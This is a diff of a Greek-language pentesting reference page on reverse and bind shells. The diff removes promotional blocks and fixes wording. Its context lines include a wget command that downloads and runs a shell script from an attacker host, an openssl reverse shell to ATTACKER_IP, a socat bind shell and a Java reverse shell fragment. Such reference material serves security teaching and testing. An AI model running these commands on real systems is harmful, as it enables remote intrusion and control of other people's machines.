@@ -15,14 +15,6 @@
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 **Αν έχετε ερωτήσεις σχετικά με οποιαδήποτε από αυτές τις shells μπορείτε να τις ελέγξετε με** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
@@ -70,7 +62,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 Όταν ασχολείστε με μια **Remote Code Execution (RCE)** ευπάθεια σε μια εφαρμογή ιστού βασισμένη σε Linux, η επίτευξη ενός reverse shell μπορεί να εμποδιστεί από αμυντικά δίκτυα όπως οι κανόνες iptables ή περίπλοκοι μηχανισμοί φιλτραρίσματος πακέτων. Σε τέτοιες περιορισμένες συνθήκες, μια εναλλακτική προσέγγιση περιλαμβάνει τη δημιουργία ενός PTY (Pseudo Terminal) shell για να αλληλεπιδράσετε με το παραβιασμένο σύστημα πιο αποτελεσματικά.
 
-Ένα προτεινόμενο εργαλείο για αυτό το σκοπό είναι το [toboggan](https://github.com/n3rada/toboggan.git), το οποίο απλοποιεί την αλληλεπίδραση με το περιβάλλον στόχο.
+Ένα προτεινόμενο εργαλείο για αυτό το σκοπό είναι το [toboggan](https://github.com/n3rada/toboggan.git), το οποίο απλοποιεί την αλληλεπίδραση με το περιβάλλον στόχου.
 
 Για να χρησιμοποιήσετε το toboggan αποτελεσματικά, δημιουργήστε ένα Python module προσαρμοσμένο στο RCE πλαίσιο του συστήματος στόχου σας. Για παράδειγμα, ένα module με όνομα `nix.py` θα μπορούσε να δομηθεί ως εξής:
 ```python3
@@ -260,7 +252,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Δεσμευμένο κέλυφος
+### Shell δέσμευσης
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
@@ -339,12 +331,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
